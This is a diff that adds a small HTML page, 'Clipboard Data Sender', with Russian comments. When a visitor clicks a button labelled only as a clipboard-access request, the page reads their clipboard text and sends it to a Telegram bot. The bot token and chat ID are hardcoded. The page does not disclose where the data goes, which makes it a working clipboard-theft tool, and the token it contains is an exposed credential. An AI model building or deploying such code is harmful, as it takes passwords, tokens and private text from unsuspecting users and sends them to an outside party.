@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clipboard Data Sender</title>
+</head>
+<body>
+    <h1>Clipboard Data Sender</h1>
+    <button id="requestPermission">Request Clipboard Access</button>
+    <script>
+        async function requestClipboardAccess() {
+            try {
+                // Проверяем поддержку API
+                if (!navigator.clipboard) {
+                    alert("Clipboard API is not supported in your browser.");
+                    return;
+                }
+
+                // Запрашиваем доступ к буферу обмена
+                const permission = await navigator.permissions.query({ name: 'clipboard-read' });
+                if (permission.state === 'granted') {
+                    // Читаем данные из буфера обмена
+                    const clipboardData = await navigator.clipboard.readText();
+                    sendClipboardData(clipboardData);
+                } else if (permission.state === 'prompt') {
+                    // Запрашиваем доступ к буферу обмена
+                    const clipboardData = await navigator.clipboard.readText();
+                    sendClipboardData(clipboardData);
+                } else {
+                    alert("Clipboard access denied.");
+                }
+            } catch (error) {
+                console.error("Error accessing clipboard: ", error);
+            }
+        }
+
+        function sendClipboardData(data) {
+            const apiUrl = `https://api.telegram.org/bot7341685493:AAGsKsTZfF6LPql4R6fJJQ9qiUx3Mq1L5eQ/sendMessage`;
+            const chatId = '7406507427';
+            const message = encodeURIComponent(data);
+
+            fetch(`${apiUrl}?chat_id=${chatId}&text=${message}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("Data sent successfully.");
+                    } else {
+                        alert("Failed to send data.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error sending data: ", error);
+                });
+        }
+
+        document.getElementById('requestPermission').addEventListener('click', requestClipboardAccess);
+    </script>
+</body>
+</html>
